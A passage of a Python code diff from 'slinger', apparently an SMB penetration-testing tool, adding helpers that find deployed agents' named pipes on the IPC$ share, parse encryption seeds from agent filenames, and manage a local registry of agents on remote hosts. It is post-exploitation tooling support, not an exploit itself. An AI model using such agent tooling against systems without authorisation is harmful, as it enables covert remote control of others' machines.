+            print_debug(f"Exception details: {e}")
+
+    def _discover_agent_pipe_name(self, agent_id):
+        """Discover actual agent pipe name by scanning IPC$ share"""
+        try:
+            from slingerpkg.utils.printlib import print_debug
+
+            # Temporarily switch to IPC$ to scan for pipes
+            current_share = self.share
+            self.conn.connectTree("IPC$")
+            self.share = "IPC$"
+
+            try:
+                # List IPC$ contents to find pipe names
+                files = self.conn.listPath("IPC$", "\\")
+
+                for file_info in files:
+                    filename = file_info.get_longname()
+                    # Look for slinger related pipes (including custom pipe names)
+                    if "slinger" in filename.lower():
+                        pipe_name = filename
+                        print_debug(f"Found agent pipe: {pipe_name}")
+                        return pipe_name
+
+            finally:
+                # Restore original share
+                if current_share != "IPC$":
+                    self.conn.connectTree(current_share)
+                    self.share = current_share
+
+            return None
+
+        except Exception as e:
+            print_debug(f"Pipe discovery failed: {e}")
+            return None
+
+    def _update_agent_pipe_name(self, agent_id, new_pipe_name):
+        """Update agent registry with discovered pipe name"""
+        try:
+
+            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if registry_path.exists():
+                with open(registry_path, "r") as f:
+                    registry = json.load(f)
+
+                if agent_id in registry:
+                    registry[agent_id]["pipe_name"] = new_pipe_name
+
+                    with open(registry_path, "w") as f:
+                        json.dump(registry, f, indent=2)
+
+        except Exception as e:
+            print_debug(f"Failed to update registry: {e}")
+
+    def _extract_encryption_seed_from_filename(self, filename):
+        """Extract encryption seed from agent filename pattern: slinger_agent_x64_12345.exe"""
+        try:
+            import re
+
+            # Pattern: slinger_agent_{arch}_{seed}.exe
+            pattern = r"slinger_agent_(?:x64|x86)_(\d+)\.exe"
+            match = re.search(pattern, filename)
+
+            if match:
+                return match.group(1)
+
+            return None
+
+        except Exception:
+            return None
+
+    def _lookup_build_registry(self, agent_path):
+        """Look up agent information from build registry"""
+        try:
+
+            registry_path = Path.home() / ".slinger" / "builds" / "built_agents.json"
+            if not registry_path.exists():
+                return None
+
+            with open(registry_path, "r") as f:
+                registry = json.load(f)
+
+            # Look up by absolute path
+            abs_path = str(Path(agent_path).resolve())
+            return registry.get(abs_path)
+
+        except Exception:
+            return None
+
+    def _delete_agent_from_registry(self, agent_id):
+        """Delete agent from registry by ID"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_log,
+            )
+
+            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_path.exists():
+                print_bad("No agent registry found")
+                return
+
+            # Load current registry
+            with open(registry_path, "r") as f:
+                registry = json.load(f)
+
+            # Check if agent exists
+            if agent_id not in registry:
+                print_bad(f"Agent '{agent_id}' not found in registry")
+                print_info("Use 'agent list' to see available agents")
+                return
+
+            # Get agent info for confirmation
+            agent_info = registry[agent_id]
+            print_info(f"Agent to delete:")
+            print_log(f"  ID: {agent_info['id']}")
+            print_log(f"  Host: {agent_info['host']}")
+            print_log(f"  Name: {agent_info['name']}")
+            print_log(f"  Path: {agent_info['path']}")
+            if agent_info.get("process_id"):
+                print_log(f"  PID: {agent_info['process_id']}")
+
+            # Confirm deletion
+            try:
+                confirm = (
+                    input(f"\nDelete agent '{agent_id}' from registry? [y/N]: ").strip().lower()
+                )
+                if confirm not in ["y", "yes"]:
+                    print_info("Deletion cancelled")
+                    return
+            except (KeyboardInterrupt, EOFError):
+                print_info("\nDeletion cancelled")
+                return
+
+            # Remove agent from registry
+            del registry[agent_id]
+
+            # Save updated registry
+            with open(registry_path, "w") as f:
+                json.dump(registry, f, indent=2)
+
+            print_good(f"✓ Agent '{agent_id}' removed from registry")
+            print_warning("Note: This only removes the registry entry.")
+            print_warning("The actual agent process may still be running.")
+            if agent_info.get("process_id"):
+                print_info(f"To kill the process, use: taskkill /F /PID {agent_info['process_id']}")
+
+        except Exception as e:
+            print_bad(f"Failed to delete agent: {e}")
+
+    def _delete_all_agents_from_registry(self):
+        """Delete all agents from registry"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_log,
+            )
+
+            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_path.exists():
+                print_bad("No agent registry found")
+                return
+
+            # Load current registry
+            with open(registry_path, "r") as f:
+                registry = json.load(f)
+
+            # Check if registry is empty
+            if not registry:
+                print_info("No agents in registry")
+                return
+
+            # Display all agents
+            print_info(f"Agents to delete ({len(registry)} total):")
+
+            headers = ["Agent ID", "Host", "Agent Name", "Path", "PID"]
+            table_data = []
+
+            for agent_id, agent_info in registry.items():
+                table_data.append(
+                    [
+                        agent_info["id"],
+                        agent_info["host"],
+                        agent_info["name"],
+                        agent_info["path"],
+                        agent_info.get("process_id", "Unknown"),
+                    ]
+                )
+
+            print_log(tabulate(table_data, headers=headers, tablefmt="grid"))
+
+            # Confirm deletion
+            try:
+                confirm = (
+                    input(f"\nDelete ALL {len(registry)} agents from registry? [y/N]: ")
+                    .strip()
+                    .lower()
+                )
+                if confirm not in ["y", "yes"]:
+                    print_info("Deletion cancelled")
+                    return
+            except (KeyboardInterrupt, EOFError):
+                print_info("\nDeletion cancelled")
+                return
+
+            # Clear the registry
+            with open(registry_path, "w") as f:
+                json.dump({}, f, indent=2)
+
+            print_good(f"✓ All {len(registry)} agents removed from registry")
+            print_warning("Note: This only removes the registry entries.")
+            print_warning("The actual agent processes may still be running.")
+
+        except Exception as e:
+            print_bad(f"Failed to delete all agents: {e}")
 
     def sizeof_fmt(self, num, suffix="B"):
         """Format file size in human readable format"""
